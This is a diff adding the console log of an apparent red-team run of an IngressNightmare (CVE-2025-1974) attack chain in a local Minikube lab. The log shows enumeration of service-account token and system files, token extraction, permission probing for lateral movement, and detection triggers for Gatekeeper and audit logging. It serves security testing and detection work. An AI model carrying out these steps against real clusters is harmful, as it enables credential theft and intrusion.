@@ -1,0 +1,93 @@
+
+============================================================
+  CVE-2025-1974 (IngressNightmare) — Red Team 공격 체인
+  대상: 로컬 Minikube 격리 환경 전용
+============================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  Pre-flight 검사
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [OK]    kubectl 사용 가능
+  [WARN]  클러스터 연결 불가 — kubectl_exec 방법 스킵
+  [OK]    Webhook 연결 확인: https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local:443
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  T1 — 파일 열거 (시나리오 A)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  [파일 열거] 대상 12개 경로 탐색 중...
+  target: https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local:443
+
+  [접근가능] /var/run/secrets/kubernetes.io/serviceaccount/token
+  [접근가능] /var/run/secrets/kubernetes.io/serviceaccount/namespace
+  [접근가능] /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+  [접근가능] /etc/hosts
+  [접근가능] /etc/resolv.conf
+  [접근가능] /etc/passwd
+  [접근불가] /proc/self/environ
+  [접근불가] /proc/self/cmdline
+  [접근불가] /proc/net/tcp
+  [접근가능] /sys/class/net/eth0/address
+  [접근불가] /proc/self/mountinfo
+  [접근가능] /etc/hostname
+
+  [OK]    열거 완료: 8/12 경로 접근 가능
+  [INFO]  D2 탐지 트리거: kube-apiserver 경유 악성 Ingress 제출...
+
+  [D2 트리거] kube-apiserver 경유 악성 Ingress 제출
+  → Error from server (Forbidden): error when retrieving current configuration of:
+Resource: "networking.k8s.io/v1, Resource=ingresses", GroupVersionKind: "networking.k8s.io/v1, Kind=Ingress"
+Name: "d2-trigger-probe", Namespace: "default"
+from server for: "/tmp/tmpz_5dlcwe.yaml": ingresses.networking.k8s.io "d2-trigger-probe" is forbidden: User "system:serviceaccount:default:attacker-sa" cannot get resource "ingresses" in API group "networking.k8s.io" in the namespace "default"
+  → Gatekeeper violation 확인 : make detect-gatekeeper-violations
+  → Audit Log 확인            : make detect-audit-tail
+  → Ingress 정리 완료
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  T2 — SA 토큰 추출 (시나리오 B)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [INFO]  방법 1: kubectl exec (기본)
+  [INFO]  방법 2: webhook 에러 메시지 파싱 (fallback)
+
+  [OK]    토큰 추출 성공 (방법: kubectl_exec)
+  [OK]    ServiceAccount: /
+  [INFO]  JWT 헤더: {'alg': 'RS256', 'kid': 'Gva9PRznHVxcz4qRmDemeIdfRTptebMc0sYnrcobDYo'}
+  [INFO]  토큰 앞 60자: [REDACTED_JWT_PREFIX]...
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  T3 — Kubernetes API Lateral Movement (시나리오 C)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  [OK]    Level 1 — 정보 수집: 성공
+  [INFO]    secrets: 7개
+  [INFO]    configmaps: 18개
+  [INFO]    pods: 15개
+
+  [WARN]  Level 2 — 다른 SA 토큰 탈취: 실패
+
+  [OK]    Level 3 — 권한 상승 확인: 성공
+  [no]  create pods (kube-system)
+  [no]  create clusterrolebindings
+  [no]  get secrets (kube-system)
+  [no]  create pods (all ns)
+  [YES] list secrets (all ns)
+  [no]  impersonate serviceaccounts
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  T4 — 결과 리포트 생성
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [OK]    JSON 리포트: /attack/results/attack_result_20260517T044115Z.json
+  [OK]    MD  리포트:  /attack/results/attack_result_20260517T044115Z.md
+
+
+==========================================================
+  공격 체인 실행 결과 요약
+==========================================================
+  [OK]   T1 파일 열거     — 접근가능 8개 / 12개
+  [OK]   T2 토큰 추출    — 성공 (kubectl_exec)
+  [OK]   T3 Lateral Move — 레벨 [1, 2, 3] 실행
+==========================================================
+
+============================================================
+  공격 체인 종료
+============================================================
